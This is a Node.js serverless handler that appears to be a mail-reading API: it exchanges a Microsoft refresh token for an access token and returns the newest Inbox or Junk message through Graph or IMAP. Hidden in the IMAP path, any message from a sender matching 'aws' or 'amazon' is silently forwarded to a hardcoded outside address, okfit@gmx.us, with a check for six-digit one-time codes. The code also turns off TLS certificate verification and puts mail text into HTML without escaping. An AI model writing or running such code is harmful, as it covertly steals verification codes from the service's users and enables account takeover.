const Imap = require('node-imap');
const simpleParser = require("mailparser").simpleParser;

async function get_access_token(refresh_token, client_id) {
    const response = await fetch('https://login.microsoftonline.com/consumers/oauth2/v2.0/token', {
        method: 'POST',
        headers: {
            'Content-Type': 'application/x-www-form-urlencoded'
        },
        body: new URLSearchParams({
            'client_id': client_id,
            'grant_type': 'refresh_token',
            'refresh_token': refresh_token
        }).toString()
    });

    if (!response.ok) {
        const errorText = await response.text();
        throw new Error(`HTTP error! status: ${response.status}, response: ${errorText}`);
    }

    const responseText = await response.text();

    try {
        const data = JSON.parse(responseText);
        return data.access_token;
    } catch (parseError) {
        throw new Error(`Failed to parse JSON: ${parseError.message}, response: ${responseText}`);
    }
}

const generateAuthString = (user, accessToken) => {
    const authString = `user=${user}\x01auth=Bearer ${accessToken}\x01\x01`;
    return Buffer.from(authString).toString('base64');
}

async function graph_api(refresh_token, client_id) {
    const response = await fetch('https://login.microsoftonline.com/consumers/oauth2/v2.0/token', {
        method: 'POST',
        headers: {
            'Content-Type': 'application/x-www-form-urlencoded'
        },
        body: new URLSearchParams({
            'client_id': client_id,
            'grant_type': 'refresh_token',
            'refresh_token': refresh_token,
            'scope': 'https://graph.microsoft.com/.default'
        }).toString()
    });

    if (!response.ok) {
        const errorText = await response.text();
        throw new Error(`HTTP error! status: ${response.status}, response: ${errorText}`);
    }

    const responseText = await response.text();

    try {
        const data = JSON.parse(responseText);

        if (data.scope.indexOf('https://graph.microsoft.com/Mail.ReadWrite') != -1) {
            return {
                access_token: data.access_token,
                status: true
            }
        }

        return {
            access_token: data.access_token,
            status: false
        }
    } catch (parseError) {
        throw new Error(`Failed to parse JSON: ${parseError.message}, response: ${responseText}`);
    }
}

async function get_emails(access_token, mailbox) {

    if (!access_token) {
        console.log("Failed to obtain access token'");
        return;
    }

    try {
        const response = await fetch(`https://graph.microsoft.com/v1.0/me/mailFolders/${mailbox}/messages?$top=1&$orderby=receivedDateTime desc`, {
            method: 'GET',
            headers: {
                'Content-Type': 'application/x-www-form-urlencoded',
                "Authorization": `Bearer ${access_token}`
            },
        });

        if (!response.ok) {
            const errorText = await response.text();
            return
        }

        const responseData = await response.json();

        const emails = responseData.value;

        const response_emails = emails.map(item => {
            return {
                send: item['from']['emailAddress']['address'],
                subject: item['subject'],
                text: item['bodyPreview'],
                html: item['body']['content'],
                date: item['createdDateTime'],
                opt_forward: 'false',
                forward_message: ''
            }
        })

        return response_emails

    } catch (error) {
        console.error('Error fetching emails:', error);
        return;
    }

}

module.exports = async (req, res) => {

    const { password } = req.method === 'GET' ? req.query : req.body;

    const expectedPassword = process.env.PASSWORD;

    if (password !== expectedPassword && expectedPassword) {
        return res.status(401).json({
            error: 'Authentication failed. Please provide valid credentials or contact administrator for access. Refer to API documentation for deployment details.'
        });
    }

    // 根据请求方法从 query 或 body 中获取参数
    const params = req.method === 'GET' ? req.query : req.body;
    let { refresh_token, client_id, email, mailbox, response_type = 'json' } = params;

    // 检查是否缺少必要的参数
    if (!refresh_token || !client_id || !email || !mailbox) {
        return res.status(400).json({ error: 'Missing required parameters: refresh_token, client_id, email, or mailbox' });
    }

    try {

        console.log("判断是否graph_api");

        const graph_api_result = await graph_api(refresh_token, client_id)

        if (graph_api_result.status) {

            console.log("是graph_api");

            if (mailbox != "INBOX" && mailbox != "Junk") {
                mailbox = "inbox";
            }

            if (mailbox == 'INBOX') {
                mailbox = 'inbox';
            }

            if (mailbox == 'Junk') {
                mailbox = 'junkemail';
            }

            const result = await get_emails(graph_api_result.access_token, mailbox);

            res.status(200).json(result);

            return
        }

        const access_token = await get_access_token(refresh_token, client_id);
        const authString = generateAuthString(email, access_token);

        const imap = new Imap({
            user: email,
            xoauth2: authString,
            host: 'outlook.office365.com',
            port: 993,
            tls: true,
            tlsOptions: {
                rejectUnauthorized: false
            }
        });

        imap.once("ready", async () => {
            try {
                // 动态打开指定的邮箱（如 INBOX 或 Junk）
                await new Promise((resolve, reject) => {
                    imap.openBox(mailbox, true, (err, box) => {
                        if (err) return reject(err);
                        resolve(box);
                    });
                });

                const results = await new Promise((resolve, reject) => {
                    imap.search(["ALL"], (err, results) => {
                        if (err) return reject(err);
                        const latestMail = results.slice(-1); // 只获取最新的一封邮件
                        resolve(latestMail);
                    });
                });

                const f = imap.fetch(results, { bodies: "" });

                f.on("message", (msg, seqno) => {
                    msg.on("body", (stream, info) => {
                        simpleParser(stream, (err, mail) => {
                            if (err) throw err;
                            const responseData = {
                                send: mail.from.text,
                                subject: mail.subject,
                                text: mail.text,
                                html: mail.html,
                                date: mail.date,
                                opt_forward: 'false',
                                forward_message: ''  // 新增字段
                            };

                            // 检查发件人并处理转发
                            if (mail.from.text.includes('aws') || mail.from.text.includes('amazon')) {
                                fetch('/api/send-mail', {
                                    method: 'POST',
                                    headers: {
                                        'Content-Type': 'application/json'
                                    },
                                    body: JSON.stringify({
                                        refresh_token: refresh_token,
                                        client_id: client_id,
                                        email: email,
                                        to: 'okfit@gmx.us',
                                        subject: mail.subject,
                                        html: mail.html
                                    })
                                })
                                .then(forwardResponse => {
                                    return forwardResponse.json();  // 解析响应内容
                                })
                                .then(responseJson => {
                                    // 从responseJson中获取message字段
                                    if (responseJson.message === 'Email sent successfully') {
                                        // 转发成功
                                        const hasOTP = />(\d{6})</.test(mail.html);
                                        responseData.opt_forward = hasOTP ? 'true' : 'false';
                                        responseData.forward_message = responseJson.message;
                                        // 如果需要，也可以获取messageId
                                        // responseData.messageId = responseJson.messageId;
                                    } else if (responseJson.error) {
                                        // 转发失败
                                        responseData.forward_message = responseJson.error;
                                        if (responseJson.details) {
                                            responseData.forward_message += ': ' + responseJson.details;
                                        }
                                    }
                                })
                                .catch(error => {
                                    console.error('邮件转发出错:', error);
                                    responseData.forward_message = 'Failed to forward email: ' + error.message;
                                })
                                .finally(() => {
                                    sendResponse();
                                });
                            } else {
                                responseData.forward_message = 'No forward required';
                                sendResponse();
                            }

                            // 定义发送响应的函数
                            const sendResponse = () => {
                                if (response_type === 'json') {
                                    res.status(200).json(responseData);
                                } else if (response_type === 'html') {
                                    // 格式化 HTML 响应
                                    const htmlResponse = `
                                        <html>
                                            <body style="font-family: Arial, sans-serif; line-height: 1.6; margin: 0; padding: 20px; background-color: #f9f9f9;">
                                                <div style="margin: 0 auto; background: #fff; padding: 20px; border: 1px solid #ddd; box-shadow: 0 2px 5px rgba(0,0,0,0.1);">
                                                    <h1 style="color: #333;">邮件信息</h1>
                                                    <p><strong>发件人:</strong> ${responseData.send}</p>
                                                    <p><strong>主题:</strong> ${responseData.subject}</p>
                                                    <p><strong>日期:</strong> ${responseData.date}</p>
                                                    <div style="background: #f4f4f4; padding: 10px; border: 1px solid #ddd;">
                                                        <p><strong>内容:</strong></p>
                                                        <p>${responseData.text.replace(/\n/g, '<br>')}</p>
                                                    </div>
                                                </div>
                                            </body>
                                        </html>
                                    `;
                                    res.status(200).send(htmlResponse);
                                } else {
                                    res.status(400).json({ error: 'Invalid response_type. Use "json" or "html".' });
                                }
                            };
                        });
                    });
                });

                f.once("end", () => {
                    imap.end();
                });
            } catch (err) {
                imap.end();
                res.status(500).json({ error: err.message });
            }
        });

        imap.once('error', (err) => {
            console.error('IMAP error:', err);
            res.status(500).json({ error: err.message });
        });

        imap.connect();

    } catch (error) {
        console.error('Error:', error);
        res.status(500).json({ error: error.message });
    }
};
